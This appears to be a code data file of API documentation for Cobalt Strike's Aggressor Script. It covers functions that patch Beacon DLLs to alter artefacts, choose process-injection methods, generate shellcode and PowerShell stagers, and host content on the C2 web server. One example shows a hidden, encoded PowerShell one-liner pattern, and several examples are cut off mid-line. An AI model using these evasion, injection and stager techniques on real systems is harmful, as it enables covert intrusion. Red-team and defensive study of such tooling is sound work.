**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — byte array to find for resolve offset
- \`$3\` — byte array place at resolved offset (overwrite data)

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ===========================================================================
# $1 = Beacon DLL content

# ===========================================================================
sub demo_pe_patch_code {

local('$temp_dll, $findme, $replacement');

$temp_dll = $1;

# ====== simple text values ======
$findme = "abcABC123";
$replacement = "123ABCabc";

# warn("pe_patch_code(dll, " . $findme . ", " . $replacement . ")");
$temp_dll = pe_patch_code($temp_dll, $findme, $replacement);

# ====== byte array as a hex string ======
$findme = "\\x01\\x02\\x03\\xfc\\xfe\\xff";
$replacement = "\\x01\\x02\\x03\\xf
\`\`\``,
    anchors: ["pe_patch_code"],
  },
  "pe_remove_rich_header": {
    name: "pe_remove_rich_header",
    detail: "pe_remove_rich_header($1)",
    documentation: `Remove the rich header from Beacon DLL Content.

**Arguments:**
- \`$1\` — Beacon DLL content

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# -------------------------------------
# Remove/Replace Rich Header
# -------------------------------------
$temp_dll = pe_remove_rich_header($temp_dll);
\`\`\``,
    anchors: ["pe_remove_rich_header"],
  },
  "pe_set_compile_time_with_long": {
    name: "pe_set_compile_time_with_long",
    detail: "pe_set_compile_time_with_long($1, $2)",
    documentation: `Set the compile time in the Beacon DLL Content.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Compile Time (as a long in milliseconds)

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# date is in milliseconds ("1893521594000" = "01 Jan 2030 12:13:14")
$date = 1893521594000;
$temp_dll = pe_set_compile_time_with_long($temp_dll, $date);

# date is in milliseconds ("1700000001000" = "14 Nov 2023 16:13:21")
$date = 1700000001000;
$temp_dll = pe_set_compile_time_with_long($temp_dll, $date);
\`\`\``,
    anchors: ["pe_set_compile_time_with_long"],
  },
  "pe_set_compile_time_with_string": {
    name: "pe_set_compile_time_with_string",
    detail: "pe_set_compile_time_with_string($1, $2)",
    documentation: `Set the compile time in the Beacon DLL Content.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Compile Time (as a string)

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ("01 Jan 2020 15:16:17" = "1577913377000")
$strTime = "01 Jan 2020 15:16:17";
$temp_dll = pe_set_compile_time_with_string($temp_dll, $strTime);
\`\`\``,
    anchors: ["pe_set_compile_time_with_string"],
  },
  "pe_set_export_name": {
    name: "pe_set_export_name",
    detail: "pe_set_export_name($1)",
    documentation: `Set the export name in the Beacon DLL Content.

**Arguments:**
- \`$1\` — Beacon DLL content

**Returns:** Updated DLL Content

**Note:** The name must exist in the string table.

**Example:**
\`\`\`
# -------------------------------------
# name must be in strings table...
# -------------------------------------
$export_name = "WININET.dll";
$temp_dll = pe_set_export_name($temp_dll, $export_name);

$export_name = "beacon.dll";
$temp_dll = pe_set_export_name($temp_dll, $export_name);
\`\`\``,
    anchors: ["pe_set_export_name"],
  },
  "pe_set_long": {
    name: "pe_set_long",
    detail: "pe_set_long($1, $2, $3)",
    documentation: `Places a long value at a specified location.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Location
- \`$3\` — Value

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_set_long {

local('$temp_dll, $int_offset, $long_value');
local('%pemap');
local('@loc_cs, @val_cs');

$temp_dll = $1;

# -------------------------------------
# Inspect the current DLL...
# -------------------------------------
%pemap = pedump($temp_dll);
@loc_cs = values(%pemap, @("CheckSum.<location>"));
@val_cs = values(%pemap, @("CheckSum.<value>"));

if (size(@val_cs) != 1) {
warn("Unexpected size
\`\`\``,
    anchors: ["pe_set_long"],
  },
  "pe_set_short": {
    name: "pe_set_short",
    detail: "pe_set_short($1, $2, $3)",
    documentation: `Places a short value at a specified location.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Location
- \`$3\` — Value

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_set_short {

local('$temp_dll, $int_offset, $short_value');
local('%pemap');
local('@loc, @val');

$temp_dll = $1;

# -------------------------------------
# Inspect the current DLL...
# -------------------------------------
%pemap = pedump($temp_dll);
@loc = values(%pemap, @(".text.NumberOfRelocations."));
@val = values(%pemap, @(".text.NumberOfRelocations."));

if (size(@val) != 1) {
warn("Unexpected 
\`\`\``,
    anchors: ["pe_set_short"],
  },
  "pe_set_string": {
    name: "pe_set_string",
    detail: "pe_set_string($1, $2, $3)",
    documentation: `Places a string value at a specified location.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Start location
- \`$3\` — Value

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_set_string {

local('$temp_dll, $location, $value');
local('%pemap');
local('@loc_en, @val_en');

$temp_dll = $1;

# -------------------------------------
# Inspect the current DLL...
# -------------------------------------
%pemap = pedump($temp_dll);
@loc_en = values(%pemap, @("Export.Name."));
@val_en = values(%pemap, @("Export.Name."));

if (size(@val_en) != 1) {
warn("Unexpected size of export name 
\`\`\``,
    anchors: ["pe_set_string"],
  },
  "pe_set_stringz": {
    name: "pe_set_stringz",
    detail: "pe_set_stringz($1, $2, $3)",
    documentation: `Places a string value at a specified location and adds a zero terminator.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Start location
- \`$3\` — String to set

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_set_stringz {

local('$temp_dll, $offset, $value');
local('%pemap');
local('@loc');

$temp_dll = $1;

# -------------------------------------
# Inspect the current DLL...
# -------------------------------------
%pemap = pedump($temp_dll);
@loc = values(%pemap, @("Sections.AddressOfName.0."));

if (size(@loc) != 1) {
warn("Unexpected size of section name location array: " . size(@loc));
} else {
warn("Cu
\`\`\``,
    anchors: ["pe_set_stringz"],
  },
  "pe_set_value_at": {
    name: "pe_set_value_at",
    detail: "pe_set_value_at($1, $2, $3)",
    documentation: `Sets a long value based on the location resolved by a name from the PE Map (see pedump).

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Name of location field
- \`$3\` — Value

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ===========================================================================
# $1 = DLL content
# ===========================================================================
sub demo_pe_set_value_at {

local('$temp_dll, $name, $long_value, $date');
local('%pemap');
local('@loc, @val');

$temp_dll = $1;

# -------------------------------------
# Inspect the current DLL...
# -------------------------------------
# %pemap = pedump($temp_dll);
# @loc = values(%pemap, @("SizeOfImage."));
# @val = values(%pemap, @("SizeOfImage."));

# if (size(@val) != 1) {
# warn("Unexpected size of SizeOfImage. v
\`\`\``,
    anchors: ["pe_set_value_at"],
  },
  "pe_stomp": {
    name: "pe_stomp",
    detail: "pe_stomp($1, $2)",
    documentation: `Set a string to null characters. Start at a specified location and sets all characters to null until a null string terminator is reached.

**Arguments:**
- \`$1\` — Beacon DLL content
- \`$2\` — Start location

**Returns:** Updated DLL Content

**Example:**
\`\`\`
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_stomp {

local('$temp_dll, $offset, $value, $old_name');
local('%pemap');
local('@loc, @val');

$temp_dll = $1;

# -------------------------------------
# Inspect the current DLL...
# -------------------------------------
%pemap = pedump($temp_dll);
@loc = values(%pemap, @("Sections.AddressOfName.1."));
@val = values(%pemap, @("Sections.AddressOfName.1."));

if (size(@val) != 1) {
warn("Unexpected size 
\`\`\``,
    anchors: ["pe_stomp"],
  },
  "pe_update_checksum": {
    name: "pe_update_checksum",
    detail: "pe_update_checksum($1)",
    documentation: `Update the checksum in the Beacon DLL Content.

**Arguments:**
- \`$1\` — Beacon DLL content

**Returns:** Updated DLL Content

**Note:** This should be the last transformation performed.

**Example:**
\`\`\`
# -------------------------------------
# update checksum
# -------------------------------------
$temp_dll = pe_update_checksum($temp_dll);
\`\`\``,
    anchors: ["pe_update_checksum"],
  },
  "pedump": {
    name: "pedump",
    detail: "pedump($1)",
    documentation: `Parse an executable Beacon into a map of the PE Header information. The parsed information can be used for research or programmatically to make changes to the Beacon.

**Arguments:**
- \`$1\` — Beacon DLL content

**Returns:** A map of the parsed information. The map data is very similar to the "./peclone dump [file]" command output.

**Example:**
\`\`\`
# ===========================================================================
# 'case insensitive sort' from sleep manual...
# ===========================================================================
sub caseInsensitiveCompare
{
$a = lc($1);
$b = lc($2);
return $a cmp $b;
}

# ===========================================================================
# Dump PE Information
# $1 = Beacon DLL content
# ===========================================================================
sub dump_my_pe {
local('$out $key $val %pemap @sorted_keys');

%pemap = pedump($1);

# ------------------------------
\`\`\``,
    anchors: ["pedump"],
  },
  "pgraph": {
    name: "pgraph",
    detail: "Generate the pivot graph GUI component",
    documentation: `Generate the pivot graph GUI component.

**Returns:** The pivot graph GUI object (a javax.swing.JComponent)

**Example:**
\`\`\`
addVisualization("Pivot Graph", pgraph());

See also

&showVisualization
\`\`\``,
    anchors: ["pgraph"],
  },
  "pi_explicit_get": {
    name: "pi_explicit_get",
    detail: "Gets the active selection for built-in explicit injection",
    documentation: `Gets the active selection for built-in explicit injection.

**Returns:** A string name of the selected built-in explicit injection.

**Example:**
\`\`\`
println(pi_explicit_get());
\`\`\``,
    anchors: ["pi_explicit_get"],
  },
  "pi_explicit_info": {
    name: "pi_explicit_info",
    detail: "Get a list of all built-in explicit injections available",
    documentation: `Get a list of all built-in explicit injections available.

**Returns:** An array containing the names of all built-in explicit injections available.

**Example:**
\`\`\`
println(pi_explicit_info());
\`\`\``,
    anchors: ["pi_explicit_info"],
  },
  "pi_explicit_set": {
    name: "pi_explicit_set",
    detail: "pi_explicit_set($1)",
    documentation: `Sets the active selection for explicit injection

**Arguments:**
- \`$1\` — Name of the built-in explicit injection

**Example:**
\`\`\`
pi_explicit_set("TpDirect");
\`\`\``,
    anchors: ["pi_explicit_set"],
  },
  "pi_spawn_get": {
    name: "pi_spawn_get",
    detail: "Gets the active selection for built-in spawn injection",
    documentation: `Gets the active selection for built-in spawn injection.

**Returns:** A string name of the selected built-in spawn injection.

**Example:**
\`\`\`
println(pi_spawn_get());
\`\`\``,
    anchors: ["pi_spawn_get"],
  },
  "pi_spawn_info": {
    name: "pi_spawn_info",
    detail: "Get a list of all built-in spawn injections available",
    documentation: `Get a list of all built-in spawn injections available.

**Returns:** An array containing the names of all built-in spawn injections available.

**Example:**
\`\`\`
println(pi_spawn_info());
\`\`\``,
    anchors: ["pi_spawn_info"],
  },
  "pi_spawn_set": {
    name: "pi_spawn_set",
    detail: "pi_spawn_set($1)",
    documentation: `Sets the active selection for spawn injection

**Arguments:**
- \`$1\` — Name of the built-in spawn injection

**Example:**
\`\`\`
pi_spawn_set("Early Cascade");
\`\`\``,
    anchors: ["pi_spawn_set"],
  },
  "pi_user_explicit_clear": {
    name: "pi_user_explicit_clear",
    detail: "Clears the active user-defined explicit injection",
    documentation: `Clears the active user-defined explicit injection. Use this to revert to built-in explicit injections.

**Example:**
\`\`\`
pi_user_explicit_clear();
\`\`\``,
    anchors: ["pi_user_explicit_clear"],
  },
  "pi_user_explicit_get": {
    name: "pi_user_explicit_get",
    detail: "gets the 'Name' for the actively selected user-defined explicit injection",
    documentation: `gets the 'Name' for the actively selected user-defined explicit injection.

**Returns:** A string name of the selected user-defined explicit injection. Null if no user-defined selection is currently selected.

**Example:**
\`\`\`
println(pi_user_explicit_get());
\`\`\``,
    anchors: ["pi_user_explicit_get"],
  },
  "pi_user_explicit_get_map": {
    name: "pi_user_explicit_get_map",
    detail: "Gets the map of all available user-defined explicit injections and their paths",
    documentation: `Gets the map of all available user-defined explicit injections and their paths.

**Example:**
\`\`\`
println(pi_user_explicit_get_map());
\`\`\``,
    anchors: ["pi_user_explicit_get_map"],
  },
  "pi_user_explicit_get_names": {
    name: "pi_user_explicit_get_names",
    detail: "Gets a list of all available user-defined explicit injection 'Names'",
    documentation: `Gets a list of all available user-defined explicit injection 'Names'.

**Example:**
\`\`\`
println(pi_user_explicit_get_names());
\`\`\``,
    anchors: ["pi_user_explicit_get_names"],
  },
  "pi_user_explicit_set": {
    name: "pi_user_explicit_set",
    detail: "pi_user_explicit_set($1)",
    documentation: `Sets the 'Name' for the actively selected user-defined explicit injection. User-defined explicit injections supersede built-in explicit injection selections.

**Arguments:**
- \`$1\` — Name of the user-defined explicit injection. This injection must have been added to the map of available explicit injections via the PROCESS_INJECT_EXPLICIT_USER hook.

**Example:**
\`\`\`
pi_user_explicit_set("MyFavoriteExplicitInjection-x64");
\`\`\``,
    anchors: ["pi_user_explicit_set"],
  },
  "pi_user_spawn_clear": {
    name: "pi_user_spawn_clear",
    detail: "Clears the active user-defined spawn injection",
    documentation: `Clears the active user-defined spawn injection. Use this to revert to built-in spawn injections.

**Example:**
\`\`\`
pi_user_spawn_clear();
\`\`\``,
    anchors: ["pi_user_spawn_clear"],
  },
  "pi_user_spawn_get": {
    name: "pi_user_spawn_get",
    detail: "gets the 'Name' for the actively selected user-defined spawn injection",
    documentation: `gets the 'Name' for the actively selected user-defined spawn injection

**Returns:** A string name of the selected user-defined spawn injection. Null if no user-defined selection is currently selected.

**Example:**
\`\`\`
println(pi_user_spawn_get());
\`\`\``,
    anchors: ["pi_user_spawn_get"],
  },
  "pi_user_spawn_get_map": {
    name: "pi_user_spawn_get_map",
    detail: "Gets the map of all available user-defined spawn injections and their paths",
    documentation: `Gets the map of all available user-defined spawn injections and their paths.

**Example:**
\`\`\`
println(pi_user_spawn_get_map());
\`\`\``,
    anchors: ["pi_user_spawn_get_map"],
  },
  "pi_user_spawn_get_names": {
    name: "pi_user_spawn_get_names",
    detail: "Gets a list of all available user-defined spawn injection 'Names'",
    documentation: `Gets a list of all available user-defined spawn injection 'Names'.

**Example:**
\`\`\`
println(pi_user_spawn_get_names());
\`\`\``,
    anchors: ["pi_user_spawn_get_names"],
  },
  "pi_user_spawn_set": {
    name: "pi_user_spawn_set",
    detail: "pi_user_spawn_set($1)",
    documentation: `Sets the 'Name' for the actively selected user-defined spawn injection. User-defined spawn injections supersede built-in spawn injection selections.

**Arguments:**
- \`$1\` — Name of the user-defined spawn injection. This injection must have been added to the map of available explicit injections via the PROCESS_INJECT_SPAWN_USER hook.

**Example:**
\`\`\`
pi_user_spawn_set("MyFavoriteSpawnInjection-x64");
\`\`\``,
    anchors: ["pi_user_spawn_set"],
  },
  "pivots": {
    name: "pivots",
    detail: "Returns a list of SOCKS pivots from Cobalt Strike's data model",
    documentation: `Returns a list of SOCKS pivots from Cobalt Strike's data model.

**Returns:** An array of dictionary objects with information about each pivot.

**Example:**
\`\`\`
printAll(pivots());
\`\`\``,
    anchors: ["pivots"],
  },
  "popup_clear": {
    name: "popup_clear",
    detail: "popup_clear($1)",
    documentation: `Remove all popup menus associated with the current menu. This is a way to override Cobalt Strike's default popup menu definitions.

**Arguments:**
- \`$1\` — the popup hook to clear registered menus for

**Example:**
\`\`\`
popup_clear("help");

popup help {
item "My stuff!" {
show_message("This is my menu!");
}
}
\`\`\``,
    anchors: ["popup_clear"],
  },
  "powershell": {
    name: "powershell",
    detail: "powershell($1, $2, $3)",
    documentation: `DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_stager and &powershell_command instead.

Returns a PowerShell one-liner to bootstrap the specified listener.

**Arguments:**
- \`$1\` — the listener name
- \`$2\` — [true/false]: is this listener targeting local host?
- \`$3\` — x86|x64 - the architecture of the generated stager.

**Returns:** A PowerShell one-liner to run the specified listener.

**Note:** Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.

**Example:**
\`\`\`
println(powershell("my-listener", false));
\`\`\``,
    anchors: ["powershell"],
  },
  "powershell_command": {
    name: "powershell_command",
    detail: "powershell_command($1, $2)",
    documentation: `Returns a one-liner to run a PowerShell expression (e.g., powershell.exe -nop -w hidden -encodedcommand MgAgACsAIAAyAA==)

**Arguments:**
- \`$1\` — the PowerShell expression to wrap into a one-liner.
- \`$2\` — will the PowerShell command run on a remote target?

**Returns:** Returns a powershell.exe one-liner to run the specified expression.

**Example:**
\`\`\`
$cmd = powershell_command("2 + 2", false);
println($cmd);
\`\`\``,
    anchors: ["powershell_command"],
  },
  "powershell_compress": {
    name: "powershell_compress",
    detail: "powershell_compress($1)",
    documentation: `Compresses a PowerShell script and wraps it in a script to decompress and execute it.

**Arguments:**
- \`$1\` — the PowerShell script to compress.

**Example:**
\`\`\`
$script = powershell_compress("2 + 2");
\`\`\``,
    anchors: ["powershell_compress"],
  },
  "pref_get": {
    name: "pref_get",
    detail: "pref_get($1, $2)",
    documentation: `Grabs a string value from Cobalt Strike's preferences.

**Arguments:**
- \`$1\` — the preference name
- \`$2\` — the default value [if there is no value for this preference]

**Returns:** A string with the preference value.

**Example:**
\`\`\`
$foo = pref_get("foo.string", "bar");
\`\`\``,
    anchors: ["pref_get"],
  },
  "pref_get_list": {
    name: "pref_get_list",
    detail: "pref_get_list($1)",
    documentation: `Grabs a list value from Cobalt Strike's preferences.

**Arguments:**
- \`$1\` — the preference name

**Returns:** An array with the preference values

**Example:**
\`\`\`
@foo = pref_get_list("foo.list");
\`\`\``,
    anchors: ["pref_get_list"],
  },
  "pref_set": {
    name: "pref_set",
    detail: "pref_set($1, $2)",
    documentation: `Set a value in Cobalt Strike's preferences

**Arguments:**
- \`$1\` — the preference name
- \`$2\` — the preference value

**Example:**
\`\`\`
pref_set("foo.string", "baz!");
\`\`\``,
    anchors: ["pref_set"],
  },
  "pref_set_list": {
    name: "pref_set_list",
    detail: "pref_set_list($1, $2)",
    documentation: `Stores a list value into Cobalt Strike's preferences.

**Arguments:**
- \`$1\` — the preference name
- \`$2\` — an array of values for this preference

**Example:**
\`\`\`
pref_set_list("foo.list", @("a", "b", "c"));
\`\`\``,
    anchors: ["pref_set_list"],
  },
  "previousTab": {
    name: "previousTab",
    detail: "Activate the tab that is to the left of the current tab",
    documentation: `Activate the tab that is to the left of the current tab.

**Example:**
\`\`\`
bind Ctrl+Left {
previousTab();
}
\`\`\``,
    anchors: ["previousTab"],
  },
  "privmsg": {
    name: "privmsg",
    detail: "privmsg($1, $2)",
    documentation: `Post a private message to a user in the event log

**Arguments:**
- \`$1\` — who to send the message to
- \`$2\` — the message

**Example:**
\`\`\`
privmsg("raffi", "what's up man?");
\`\`\``,
    anchors: ["privmsg"],
  },
  "process_browser": {
    name: "process_browser",
    detail: "Opens the Process Browser",
    documentation: `Opens the Process Browser. This function does not have any parameters.`,
    anchors: ["process_browser"],
  },
  "prompt_confirm": {
    name: "prompt_confirm",
    detail: "prompt_confirm($1, $2, $3)",
    documentation: `Show a dialog with Yes/No buttons. If the user presses yes, call the specified function.

**Arguments:**
- \`$1\` — text in the dialog
- \`$2\` — title of the dialog
- \`$3\` — a callback function. Called when the user presses yes.

**Example:**
\`\`\`
prompt_confirm("Do you feel lucky?", "Do you?", {
show_mesage("Ok, I got nothing");
});
\`\`\``,
    anchors: ["prompt_confirm"],
  },
  "prompt_directory_open": {
    name: "prompt_directory_open",
    detail: "prompt_directory_open($1, $2, $3, $4)",
    documentation: `Show a directory open dialog.

**Arguments:**
- \`$1\` — title of the dialog
- \`$2\` — default value
- \`$3\` — true/false: allow user to select multiple folders?
- \`$4\` — a callback function. Called when the user chooses a folder. The argument to the callback is the selected folder. If multiple folders are selected, they will still be specified as the first argument, separated by commas.

**Example:**
\`\`\`
prompt_directory_open("Choose a folder", $null, false, {
show_message("You chose: $1");
});
\`\`\``,
    anchors: ["prompt_directory_open"],
  },
  "prompt_file_open": {
    name: "prompt_file_open",
    detail: "prompt_file_open($1, $2, $3, $4)",
    documentation: `Show a file open dialog.

**Arguments:**
- \`$1\` — title of the dialog
- \`$2\` — default value
- \`$3\` — true/false: allow user to select multiple files?
- \`$4\` — a callback function. Called when the user chooses a file to open. The argument to the callback is the selected file. If multiple files are selected, they will still be specified as the first argument, separated by commas.

**Example:**
\`\`\`
prompt_file_open("Choose a file", $null, false, {
show_message("You chose: $1");
});
\`\`\``,
    anchors: ["prompt_file_open"],
  },
  "prompt_file_save": {
    name: "prompt_file_save",
    detail: "prompt_file_save($1, $2)",
    documentation: `Show a file save dialog.

**Arguments:**
- \`$1\` — default value
- \`$2\` — a callback function. Called when the user chooses a filename. The argument to the callback is the desired file.

**Example:**
\`\`\`
prompt_file_save($null, {
local('$handle');
$handle = openf("> $+ $1");
println($handle, "I am content");
closef($handle);
});
\`\`\``,
    anchors: ["prompt_file_save"],
  },
  "prompt_text": {
    name: "prompt_text",
    detail: "prompt_text($1, $2, $3)",
    documentation: `Show a dialog that asks the user for text.

**Arguments:**
- \`$1\` — text in the dialog
- \`$2\` — default value in the text field.
- \`$3\` — a callback function. Called when the user presses OK. The first argument to this callback is the text the user provided.

**Example:**
\`\`\`
prompt_text("What is your name?", "Cyber Bob", {
show_mesage("Hi $1 $+ , nice to meet you!");
});
\`\`\``,
    anchors: ["prompt_text"],
  },
  "range": {
    name: "range",
    detail: "range($1)",
    documentation: `Generate an array of numbers based on a string description of ranges.

**Arguments:**
- \`$1\` — a string with a description of ranges

**Returns:** An array of numbers within the specified ranges.

**Example:**
\`\`\`
printAll(range("2,4-6"));
\`\`\``,
    anchors: ["range"],
  },
  "redactobject": {
    name: "redactobject",
    detail: "redactobject($1)",
    documentation: `Removes a post-exploitation object (e.g., screenshot, keystroke buffer) from the user interface.

**Arguments:**
- \`$1\` — the ID of the post-exploitation object.`,
    anchors: ["redactobject"],
  },
  "removeTab": {
    name: "removeTab",
    detail: "Close the active tab",
    documentation: `Close the active tab

**Example:**
\`\`\`
bind Ctrl+D {
removeTab();
}
\`\`\``,
    anchors: ["removeTab"],
  },
  "resetData": {
    name: "resetData",
    detail: "Reset Cobalt Strike's data model",
    documentation: `Reset Cobalt Strike's data model.`,
    anchors: ["resetData"],
  },
  "say": {
    name: "say",
    detail: "say($1)",
    documentation: `Post a public chat message to the event log.

**Arguments:**
- \`$1\` — the message

**Example:**
\`\`\`
say("Hello World!");
\`\`\``,
    anchors: ["say"],
  },
  "sbrowser": {
    name: "sbrowser",
    detail: "Generate the session browser GUI component",
    documentation: `Generate the session browser GUI component. Shows Beacon AND SSH sessions.

**Returns:** The session browser GUI object (a javax.swing.JComponent)

**Example:**
\`\`\`
addVisualization("Session Browser", sbrowser());

See also

&showVisualization
\`\`\``,
    anchors: ["sbrowser"],
  },
  "screenshots_funcs": {
    name: "screenshots_funcs",
    detail: "Returns a list of screenshots from Cobalt Strike's data model",
    documentation: `Returns a list of screenshots from Cobalt Strike's data model.

**Returns:** An array of dictionary objects with information about each screenshot.

**Example:**
\`\`\`
printAll(screenshots());
\`\`\``,
    anchors: ["screenshots_funcs"],
  },
  "script_resource": {
    name: "script_resource",
    detail: "script_resource($1)",
    documentation: `Returns the full path to a resource that is stored relative to this script file.

**Arguments:**
- \`$1\` — the file to get a path for

**Returns:** The full path to the specified file.

**Example:**
\`\`\`
println(script_resource("dummy.txt"));
\`\`\``,
    anchors: ["script_resource"],
  },
  "separator": {
    name: "separator",
    detail: "Insert a separator into the current menu tree",
    documentation: `Insert a separator into the current menu tree.

**Example:**
\`\`\`
popup foo {
item "Stuff" { ... }
separator();
item "Other Stuff" { ... }
}
\`\`\``,
    anchors: ["separator"],
  },
  "services": {
    name: "services",
    detail: "Returns a list of services in Cobalt Strike's data model",
    documentation: `Returns a list of services in Cobalt Strike's data model.

**Returns:** An array of dictionary objects with information about each service.

**Example:**
\`\`\`
printAll(services());
\`\`\``,
    anchors: ["services"],
  },
  "setup_reflective_loader": {
    name: "setup_reflective_loader",
    detail: "setup_reflective_loader($1, $2)",
    documentation: `DEPRECATED This hook is no longer needed as the stomp loader style reflective loader is no longer supported.

Insert the reflective loader executable code into a beacon payload.

**Arguments:**
- \`$1\` — Original beacon executable payload.
- \`$2\` — User defined Reflective Loader executable data.

**Returns:** The beacon executable payload updated with the user defined reflective loader. $null if there is an error.

**Note:** The user defined Reflective Loader must be less than 5k.

**Example:**
\`\`\`
See BEACON_RDLL_GENERATE hook

# ---------------------------------------------------------------------
# Replace the beacons default loader with '$loader'.
# ---------------------------------------------------------------------
$temp_dll = setup_reflective_loader($2, $loader);
\`\`\``,
    anchors: ["setup_reflective_loader"],
  },
  "setup_strings": {
    name: "setup_strings",
    detail: "setup_strings($1)",
    documentation: `Apply the strings defined in the Malleable C2 profile to the beacon payload.

**Arguments:**
- \`$1\` — beacon payload to modify

**Returns:** The updated beacon payload with the defined strings applied to the payload.

**Example:**
\`\`\`
See BEACON_RDLL_GENERATE hook

# Apply strings to the beacon payload.
$temp_dll = setup_strings($temp_dll);
\`\`\``,
    anchors: ["setup_strings"],
  },
  "setup_transformations": {
    name: "setup_transformations",
    detail: "setup_transformations($1, $2)",
    documentation: `Apply the transformations rules defined in the Malleable C2 profile to the beacon payload.

**Arguments:**
- \`$1\` — Beacon payload to modify
- \`$2\` — Beacon architecture (x86/x64)

**Returns:** The updated beacon payload with the transformations applied to the payload.

**Example:**
\`\`\`
See BEACON_RDLL_GENERATE hook

# Apply the transformations to the beacon payload.
$temp_dll = setup_transformations($temp_dll, $arch);
\`\`\``,
    anchors: ["setup_transformations"],
  },
  "shellcode": {
    name: "shellcode",
    detail: "shellcode($1, $2, $3)",
    documentation: `DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &stager instead.

Returns raw shellcode for a specific Cobalt Strike listener

**Arguments:**
- \`$1\` — the listener name
- \`$2\` — true/false: is this shellcode destined for a remote target?
- \`$3\` — x86|x64 - the architecture of the stager output.

**Returns:** A scalar containing shellcode for the specified listener.

**Note:** Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.

**Example:**
\`\`\`
$data = shellcode("my-listener", false, "x86");

$handle = openf(">out.bin");
writeb($handle, $data);
closef($handle);
\`\`\``,
    anchors: ["shellcode"],
  },
  "showVisualization": {
    name: "showVisualization",
    detail: "showVisualization($1)",
    documentation: `Switch Cobalt Strike visualization to a registered visualization.

**Arguments:**
- \`$1\` — the name of the visualization

**Example:**
\`\`\`
bind Ctrl+H {
showVisualization("Hello World");
}

See also

&showVisualization
\`\`\``,
    anchors: ["showVisualization"],
  },
  "show_error": {
    name: "show_error",
    detail: "show_error($1)",
    documentation: `Shows an error message to the user in a dialog box. Use this function to relay error information.

**Arguments:**
- \`$1\` — the message text

**Example:**
\`\`\`
show_error("You did something bad.");
\`\`\``,
    anchors: ["show_error"],
  },
  "show_message": {
    name: "show_message",
    detail: "show_message($1)",
    documentation: `Shows a message to the user in a dialog box. Use this function to relay information.

**Arguments:**
- \`$1\` — the message text

**Example:**
\`\`\`
show_message("You've won a free ringtone");
\`\`\``,
    anchors: ["show_message"],
  },
  "site_host": {
    name: "site_host",
    detail: "site_host($1, $2, $3, $4, $5, $6, $7)",
    documentation: `Host content on Cobalt Strike's web server

**Arguments:**
- \`$1\` — the host for this site (&localip is a good default)
- \`$2\` — the port (e.g., 80)
- \`$3\` — the URI (e.g., /foo)
- \`$4\` — the content to host (as a string)
- \`$5\` — the mime-type (e.g., "text/plain")
- \`$6\` — a description of the content. Shown in Site Management -> Manage.
- \`$7\` — use SSL or not (true or false)

**Returns:** The URL to this hosted site

**Example:**
\`\`\`
site_host(localip(), 80, "/", "Hello World!", "text/plain", "Hello World Page", false);
\`\`\``,
    anchors: ["site_host"],
  },
  "site_kill": {
    name: "site_kill",
    detail: "site_kill($1, $2)",
    documentation: `Remove a site from Cobalt Strike's web server

**Arguments:**
- \`$1\` — the port
- \`$2\` — the URI

**Example:**
\`\`\`
# removes the content bound to / on port 80
site_kill(80, "/");
\`\`\``,
    anchors: ["site_kill"],
  },
  "sites": {
    name: "sites",
    detail: "Returns a list of sites tied to Cobalt Strike's web server",
    documentation: `Returns a list of sites tied to Cobalt Strike's web server.

**Returns:** An array of dictionary objects with information about each registered site.

**Example:**
\`\`\`
printAll(sites());
\`\`\``,
    anchors: ["sites"],
  },
  "ssh_command_describe": {
    name: "ssh_command_describe",
    detail: "ssh_command_describe($1)",
    documentation: `Describe an SSH command.

**Arguments:**
- \`$1\` — the command

**Returns:** A string description of the SSH command.

**Example:**
\`\`\`
println(ssh_command_describe("sudo"));
\`\`\``,
    anchors: ["ssh_command_describe"],
  },
  "ssh_command_detail": {
    name: "ssh_command_detail",
    detail: "ssh_command_detail($1)",
    documentation: `Get the help information for an SSH command.

**Arguments:**
- \`$1\` — the command

**Returns:** A string with helpful information about an SSH command.

**Example:**
\`\`\`
println(ssh_command_detail("sudo"));
\`\`\``,
    anchors: ["ssh_command_detail"],
  },
  "ssh_command_group": {
    name: "ssh_command_group",
    detail: "ssh_command_group($1, $2, $3)",
    documentation: `Register an SSH Help Group. A Help Group can assist with organizing the SSH console's help command output (see SSH console help help).
Groups will not appear in help until you register commands for the group.

Added groups will reset when a client disconnects.

**Arguments:**
- \`$1\` — the group id (registers commands to the group). Do not include "," or "@" characters in group ids.
- \`$2\` — group name
- \`$3\` — group description

**Example:**
\`\`\`
ssh_alis echo {
blog($1, "You typed: " . substr($1, 5));
}

ssh_command_group(
"ssh_help_group_id",
"My SSH Group Name",
"This is my example ssh help group");

ssh_command_register(
"echo",
"echo posts to the current session's log",
"Synopsis: echo [arguments]\\n\\nLog arguments to the SSH console",
"ssh_help_group_id");
\`\`\``,
    anchors: ["ssh_command_group"],
  },
  "ssh_command_register": {
    name: "ssh_command_register",
    detail: "ssh_command_register($1, $2, $3, $4)",
    documentation: `Register help information for an SSH console command.

**Arguments:**
- \`$1\` — the command
- \`$2\` — the short description of the command
- \`$3\` — the long-form help for the command.
- \`$4\` — (optional) the group id to assign the command. If the group id does not exist, it is ignored.

**Example:**
